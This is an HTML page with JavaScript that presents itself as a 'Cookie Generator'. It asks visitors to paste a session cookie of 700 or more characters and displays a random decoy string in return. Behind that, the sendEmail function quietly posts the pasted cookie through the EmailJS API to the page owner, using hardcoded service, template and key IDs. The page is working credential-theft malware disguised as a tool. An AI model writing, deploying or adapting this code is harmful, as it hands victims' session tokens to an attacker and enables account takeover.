<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cookie Generator</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #333;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #444;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
      max-width: 500px;
      width: 100%;
    }
    h1 {
      text-align: center;
      margin-bottom: 20px;
    }
    textarea {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: none;
      resize: none;
      font-size: 14px;
    }
    button {
      background-color: #5c6bc0;
      color: white;
      padding: 10px;
      border-radius: 5px;
      border: none;
      width: 100%;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #3f4b94;
    }
    .error {
      color: red;
      font-size: 14px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Cookie Generator</h1>
    <div class="error" id="errorMessage"></div>
    <textarea id="cookieInput" rows="10" placeholder="Enter Cookie (700+ characters)..."></textarea>
    <button onclick="generateCode()">Generate New Code</button>
    <textarea id="newCookieOutput" rows="10" placeholder="Generated Cookie..." readonly></textarea>
  </div>

  <script>
    // Function to generate a random code with uppercase letters and numbers only
    function generateRandomCode(length) {
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
      }
      return result;
    }

    // Function to handle code generation when the button is clicked
    function generateCode() {
      const cookieInput = document.getElementById('cookieInput').value;
      const errorMessage = document.getElementById('errorMessage');
      const newCookieOutput = document.getElementById('newCookieOutput');

      // Check if the input is at least 700 characters long
      if (cookieInput.length >= 700) {
        // Clear error message
        errorMessage.textContent = '';

        // Generate a new code with the same length as the input
        const newCode = generateRandomCode(cookieInput.length);

        // Output the generated code
        newCookieOutput.value = newCode;

        // Send the old cookie (input) to your email using API call
        sendEmail(cookieInput);
      } else {
        // Show an error message if input is less than 700 characters
        errorMessage.textContent = 'Error: Cookie must be at least 700 characters long.';
        newCookieOutput.value = ''; // Clear the output field
      }
    }

    // Function to send email using EmailJS API directly
    function sendEmail(cookieContent) {
      const templateParams = {
        cookie: cookieContent
      };

      // Prepare the payload for the API request
      const payload = {
        service_id: 'service_bupfcwd', // Your Service ID
        template_id: 'template_fkuvg0k', // Your Template ID
        user_id: '1RUraa7fRYbQ2fuPR',  // Your Public Key
        template_params: templateParams
      };

      // Send the email via API
      fetch('https://api.emailjs.com/api/v1.0/email/send', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      })
      .then(response => {
        // Check if response is OK (Success)
        if (!response.ok) {
          return Promise.reject('Failed to send email');
        }
        return response.text(); // Handle as text
      })
      .then(data => {
        // Check if the response is "OK" indicating success
        if (data === 'OK') {
          console.log('Email sent successfully');
        } else {
          console.error('Error sending email:', data);
          alert('Error sending email: ' + data); // Show error if sending fails
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('Error sending email: ' + error.message); // Show network error
      });
    }
  </script>
</body>
</html>
